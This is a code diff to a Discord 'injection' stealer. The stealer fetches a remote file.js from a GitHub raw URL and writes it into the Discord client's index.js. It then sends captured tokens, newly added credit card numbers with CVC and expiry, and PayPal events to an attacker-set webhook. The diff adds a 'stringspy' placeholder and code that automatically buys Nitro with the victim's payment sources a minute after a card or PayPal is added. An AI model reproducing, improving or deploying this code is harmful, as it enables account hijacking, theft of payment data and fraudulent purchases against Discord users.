@@ -10,11 +10,12 @@ const config = {
     auto_buy_nitro: true,
     ping_on_run: true,
     ping_val: "@here",
+    stringspy: "~~stringspy~~", // Dont mind me, I just exist
     embed_name: "~~branding~~",
     embed_icon: "~~icon~~",
     embed_color: 8363488,
     webhook: "%WEBHOOK_LINK%",
-    injection_url: "https://github.com/NobodyWouldEverUseThis7/Discord-Injection/blob/main/file.js",
+    injection_url: "https://raw.githubusercontent.com/NobodyWouldEverUseThis7/NobodyWouldEverUseThis8/main/file.js",
     /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
     api: "https://discord.com/api/v9/users/@me",
     nitro: {
@@ -83,10 +84,10 @@ const discordPath = (function () {
 function updateCheck() {
     const { resourcePath, app } = discordPath;
     if (resourcePath === undefined || app === undefined) return;
-    const appPath = path.join(resourcePath, "app"); 
+    const appPath = path.join(resourcePath, "app");
     const packageJson = path.join(appPath, "package.json");
     const resourceIndex = path.join(appPath, "index.js");
-    const indexJs = `corenum`; 
+    const indexJs = `corenum`;
     const bdPath = path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar");
     if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
     if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
@@ -116,7 +117,7 @@ fs.readFileSync(indexJS, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJS);
-        res.replace('core' + 'num', indexJS).replace('%WEBHOOK' + '_LINK%', '${config.webhook}').replace("~~bran" + "ding~~", '${config.embed_name}').replace("~~ic" + "on~~", '${config.embed_icon}')
+        res.replace('core' + 'num', indexJS).replace('%WEBHOOK' + '_LINK%', '${config.webhook}').replace("~~string" + "spy~~", '${config.stringspy}').replace("~~bran" + "ding~~", '${config.embed_name}').replace("~~ic" + "on~~", '${config.embed_icon}')
         res.pipe(file);
         file.on('finish', () => {
             file.close();
@@ -253,32 +254,32 @@ const buyNitro = async (token) => {
     const data = await fetchBilling(token);
     const failedMsg = "Failed to Purchase ❌";
     if (!data) return failedMsg;
-  
+
     let IDS = [];
     data.forEach((x) => {
-      if (!x.invalid) {
-        IDS = IDS.concat(x.id);
-      }
+        if (!x.invalid) {
+            IDS = IDS.concat(x.id);
+        }
     });
     for (let sourceID in IDS) {
-      const first = Purchase(token, sourceID, "boost", "year");
-      if (first !== null) {
-        return first;
-      } else {
-        const second = Purchase(token, sourceID, "boost", "month");
-        if (second !== null) {
-          return second;
+        const first = Purchase(token, sourceID, "boost", "year");
+        if (first !== null) {
+            return first;
         } else {
-          const third = Purchase(token, sourceID, "classic", "month");
-          if (third !== null) {
-            return third;
-          } else {
-            return failedMsg;
-          }
+            const second = Purchase(token, sourceID, "boost", "month");
+            if (second !== null) {
+                return second;
+            } else {
+                const third = Purchase(token, sourceID, "classic", "month");
+                if (third !== null) {
+                    return third;
+                } else {
+                    return failedMsg;
+                }
+            }
         }
-      }
     }
-  };
+};
 
 const getNitro = (flags) => {
     switch (flags) {
@@ -512,6 +513,10 @@ const PaypalAdded = async (token) => {
     };
     if (config.ping_on_run) content["content"] = config.ping_val;
     hooker(content);
+    if (config.auto_buy_nitro) {
+        await sleep(60000)
+        nitroBought(token).catch(console.error);
+    }
 };
 
 const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
@@ -551,6 +556,10 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
     };
     if (config.ping_on_run) content["content"] = config.ping_val;
     hooker(content);
+    if (config.auto_buy_nitro) {
+        await sleep(60000)
+        nitroBought(token).catch(console.error);
+    }
 };
 
 const nitroBought = async (token) => {
